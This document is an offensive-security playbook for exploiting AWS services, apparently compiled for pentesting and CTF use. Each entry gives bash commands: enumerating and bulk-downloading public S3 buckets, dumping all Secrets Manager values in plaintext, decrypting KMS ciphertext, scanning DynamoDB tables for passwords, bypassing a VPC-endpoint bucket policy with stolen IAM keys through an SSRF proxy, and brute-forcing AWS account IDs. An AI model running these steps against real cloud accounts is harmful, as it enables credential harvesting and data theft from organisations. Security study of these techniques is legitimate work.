# AWS S3 & Secrets Manager Exploitation

### S3 Public Bucket Enumeration & Data Access [added: 2026-04]
- **Tags:** #AWS #S3 #PublicBucket #ACL #BucketPolicy #DataExfil #BucketFinder #AnonymousAccess
- **Trigger:** Discovered S3 bucket names during recon (subdomains, source code, error messages) or have authenticated S3 access
- **Prereq:** Bucket name (for unauthenticated) or `s3:ListBucket` + `s3:GetObject` permissions (for authenticated)
- **Yields:** Exposed files, credentials, backups, PII, and application data from misconfigured buckets
- **Opsec:** Low
- **Context:** Buckets may be misconfigured with public ACLs or bucket policies allowing anonymous access
- **Payload/Method:**
  ```bash
  # List all buckets (authenticated)
  aws s3api list-buckets

  # Check bucket ACL and policy
  aws s3api get-bucket-acl --bucket <name>
  aws s3api get-bucket-policy --bucket <name>
  aws s3api get-public-access-block --bucket <name>

  # List objects
  aws s3api list-objects --bucket <name>
  aws s3 ls s3://<bucket-name> --recursive

  # Anonymous access check (no creds)
  curl https://<bucket-name>.s3.amazonaws.com/
  curl https://<bucket-name>.s3.amazonaws.com/secret.txt

  # Bucket finder brute-force
  ./bucket_finder.rb wordlist.txt --region us
  ./bucket_finder.rb --download wordlist.txt  # download all public files
  ```

### S3 Pre-Signed URL Generation (Bypass ACLs with Temp Access) [added: 2026-04]
- **Tags:** #AWS #S3 #PreSignedURL #ACLBypass #TemporaryAccess #ObjectSharing #S3Presign
- **Trigger:** Object is not publicly accessible but you have authenticated S3 access and need to share or exfil data
- **Prereq:** Valid AWS credentials with `s3:GetObject` permission on the target object
- **Yields:** Time-limited URL granting unauthenticated access to the S3 object
- **Opsec:** Low
- **Context:** Object not publicly accessible but you have authenticated access — generate time-limited URL
- **Payload/Method:**
  ```bash
  aws s3 presign s3://<bucket>/<object> --expires-in 3600
  # Share URL — valid without AWS creds for duration
  ```

### S3 Object ACL Check [added: 2026-04]
- **Tags:** #AWS #S3 #ObjectACL #Permissions #AccessControl #BucketAudit #MisconfigCheck
- **Trigger:** Bucket-level ACL is restrictive but individual objects may have different (weaker) ACLs
- **Prereq:** `s3:GetObjectAcl` permission or public access to the object
- **Yields:** Per-object permission details revealing overly permissive access grants
- **Opsec:** Low
- **Context:** Individual objects may have different ACLs than the bucket
- **Payload/Method:**
  ```bash
  aws s3api get-object-acl --bucket <name> --key <object_key>
  ```

### SecretManager Full Dump (Authenticated) [added: 2026-04]
- **Tags:** #AWS #SecretsManager #CredentialHarvest #SecretDump #GetSecretValue #APIKeys #DBPasswords
- **Trigger:** Enumerated IAM permissions and found secretsmanager:ListSecrets + GetSecretValue access
- **Prereq:** `secretsmanager:ListSecrets` + `secretsmanager:GetSecretValue` permissions (+ KMS decrypt if custom CMK)
- **Yields:** Plaintext secrets including database passwords, API keys, OAuth tokens, and service credentials
- **Opsec:** Med
- **Context:** Have `secretsmanager:ListSecrets` + `GetSecretValue` — full credential harvest
- **Payload/Method:**
  ```bash
  # List all secrets
  aws secretsmanager list-secrets

  # Get secret metadata (includes KMS key ID)
  aws secretsmanager describe-secret --secret-id <name>

  # Dump plaintext value
  aws secretsmanager get-secret-value --secret-id <name>
  # Returns plaintext — no decryption needed, service handles it transparently

  # Check who can access the secret
  aws secretsmanager get-resource-policy --secret-id <ID>
  ```

### KMS Key Exploitation — Decrypt Encrypted Files [added: 2026-04]
- **Tags:** #AWS #KMS #Decrypt #EncryptionBypass #KeyPolicy #CMK #DataDecryption #CiphertextBlob
- **Trigger:** Found encrypted S3 objects or data and have kms:Decrypt permission
- **Prereq:** `kms:Decrypt` permission + access to the encrypted ciphertext blob + key policy allows your principal
- **Yields:** Decrypted plaintext of encrypted files (credentials, sensitive data, backups)
- **Opsec:** Med
- **Context:** Have access to an encrypted S3 file and `kms:Decrypt` permission
- **Payload/Method:**
  ```bash
  # List available keys
  aws kms list-keys
  aws kms describe-key --key-id <id>

  # See who can use the key
  aws kms list-key-policies --key-id <ID>
  aws kms get-key-policy --policy-name default --key-id <ID>

  # Decrypt ciphertext (key info embedded in ciphertext blob)
  aws kms decrypt --ciphertext-blob fileb://EncryptedFile \
    --output text --query Plaintext | base64 -d
  ```

### DynamoDB Data Exfiltration [added: 2026-04]
- **Tags:** #AWS #DynamoDB #DataExfil #NoSQL #TableDump #DatabaseExploit #LocalStack
- **Trigger:** Found DynamoDB tables via enumeration or exposed DynamoDB endpoint (LocalStack, HackTheBox)
- **Prereq:** `dynamodb:ListTables` + `dynamodb:Scan` permissions or access to exposed DynamoDB endpoint
- **Yields:** Full table contents including usernames, passwords, PII, and application data
- **Opsec:** Med
- **Context:** Exposed or misconfigured DynamoDB endpoint (e.g., local stack, HackTheBox)
- **Payload/Method:**
  ```bash
  # List tables
  aws --endpoint-url http://<target> dynamodb list-tables

  # Dump table contents
  aws --endpoint-url http://<target> dynamodb scan --table-name users | \
    jq -r '.Items[] | {username: .username.S, password: .password.S}'
  ```

### RDS IAM Token Authentication Attack [added: 2026-04]
- **Tags:** #AWS #RDS #IAMAuth #DatabaseAccess #TokenAuth #MySQL #PostgreSQL #DBCredential
- **Trigger:** Discovered RDS instance with IAM authentication enabled and have rds-db:connect permission
- **Prereq:** `rds:DescribeDBInstances` + `rds-db:connect` permission + RDS instance with IAM auth enabled
- **Yields:** Database access via temporary IAM-generated auth token (valid 15 minutes)
- **Opsec:** Med
- **Context:** RDS instance has IAM authentication enabled — generate temp token to login
- **Payload/Method:**
  ```bash
  # Check if IAM auth is enabled
  aws rds describe-db-instances | jq '.[] | .IAMDatabaseAuthenticationEnabled'

  # Generate auth token
  TOKEN=$(aws rds generate-db-auth-token \
    --hostname <db-hostname> --port 3306 \
    --username <db-user> --region us-east-1)

  # Connect
  mysql -h <hostname> -u <user> -P 3306 \
    --enable-cleartext-plugin --password="$TOKEN"
  ```

### S3 VPC Endpoint Policy Bypass via Presigned URL + SSRF Proxy [added: 2026-05]
- **Tags:** #AWS #S3 #VPCEndpoint #BucketPolicy #PresignedURL #SSRF #PolicyBypass #VPCe #PrivateBucket
- **Trigger:** S3 bucket denies direct access with 403 referencing `aws:SourceVpce` condition — bucket policy restricts to a specific VPC endpoint ID, but the EC2 instance running a vulnerable app IS inside that VPC
- **Prereq:** Stolen IAM credentials with `s3:GetObject` on the target bucket + SSRF proxy on an EC2 instance within the target VPC + presigned URL support not blocked
- **Yields:** Access to S3 objects gated behind VPC endpoint policy without direct network access to the VPC endpoint
- **Opsec:** Low
- **Context:** When a bucket policy uses `aws:SourceVpce` to allow access only from a specific VPC endpoint, direct external access is blocked. However, presigned URLs are cryptographically signed with IAM credentials and bypass the `aws:SourceVpce` condition — the VPC check is evaluated at the time of the API call, not the presigned URL request. Route the presigned URL through an SSRF proxy that lives inside the VPC to satisfy the network condition while using externally-stolen creds.
- **Payload/Method:**
  ```bash
  # Step 1 — confirm bucket policy restricts to VPC endpoint
  aws s3 cp s3://bucket/private/flag.txt .
  # → 403 Access Denied (aws:SourceVpce: vpce-0abc123...)

  # Step 2 — generate presigned URL using stolen IAM credentials
  export AWS_ACCESS_KEY_ID=<stolen_key>
  export AWS_SECRET_ACCESS_KEY=<stolen_secret>
  export AWS_SESSION_TOKEN=<stolen_token>
  PRESIGNED=$(aws s3 presign s3://bucket/private/flag.txt --expires-in 3600)
  echo $PRESIGNED   # URL-encode for use in SSRF proxy

  # Step 3 — route presigned URL through the SSRF proxy endpoint (inside VPC)
  # URL-encode the presigned URL before passing as query param
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PRESIGNED'))")
  curl -s -u 'ctf:password' "https://target/proxy?url=$ENCODED"

  # Why it works: presigned URL authentication is embedded in the URL signature,
  # not in the request source IP. The proxy makes the request from inside the VPC,
  # satisfying aws:SourceVpce, while the signed URL satisfies auth.
  ```

---

### AWS Account ID Enumeration via s3recon (s3:ResourceAccount Wildcard Brute-Force) [added: 2026-05]
- **Tags:** #AWS #Recon #AccountIDEnum #S3 #s3recon #IAMConditionKey #ResourceAccount #WildcardBruteForce #CrossAccount #AccountDiscovery
- **Trigger:** Have an S3 bucket name from the target but the bucket owner's AWS account ID is unknown or incorrect (e.g., extracted from error messages but unverified); all cross-account attacks fail; CTF box provides assumable role with session policy control
- **Prereq:** An assumable IAM role (or an identity with `sts:AssumeRole`); target S3 bucket name known; `s3recon` tool installed (`pip install s3recon`)
- **Yields:** Exact 12-digit AWS account ID of the bucket owner; unlocks all cross-account attacks that require knowing the target account ID (SNS subscribe, Lambda invoke, IAM role assumption)
- **Opsec:** Low (S3 access attempts appear as normal HeadObject/GetObject calls; 120 requests total)
- **Context:** The `s3:ResourceAccount` IAM condition key can be used in a session policy to gate S3 requests to buckets owned by a specific account prefix. `s3recon` automates digit-by-digit discovery: assume the role with a session policy restricting `s3:ResourceAccount` to `"1*"`, then `"12*"`, etc. A successful request (200 rather than AccessDenied) confirms each digit. This reduces 10¹² brute-force space to 120 requests (12 digits × 10 candidates each). Critical when SNS error messages leak a wrong account ID — the `s3:ResourceAccount` oracle is the ground truth. Do NOT trust account IDs extracted from error messages alone without verification.
- **Payload/Method:**
```bash
# Install s3recon
pip install s3recon

# Enumerate account ID owning a known bucket
# --role: assumable role in YOUR account; --bucket: any object path in the target bucket
python3 -m s3recon.cli \
  --role arn:aws:iam::<YOUR-ACCT>:role/<assumable-role> \
  --bucket <target-bucket-name>/index.html
# Output: Account ID: 123456789012

# Manual approach (if s3recon unavailable): assume role with session policy and probe
aws sts assume-role \
  --role-arn arn:aws:iam::<YOUR-ACCT>:role/<assumable-role> \
  --role-session-name recon \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"s3:GetObject","Resource":"*","Condition":{"StringLike":{"s3:ResourceAccount":"12*"}}}]}' \
  --query 'Credentials' --output json
# If successful, account starts with "12"; iterate each digit position
```
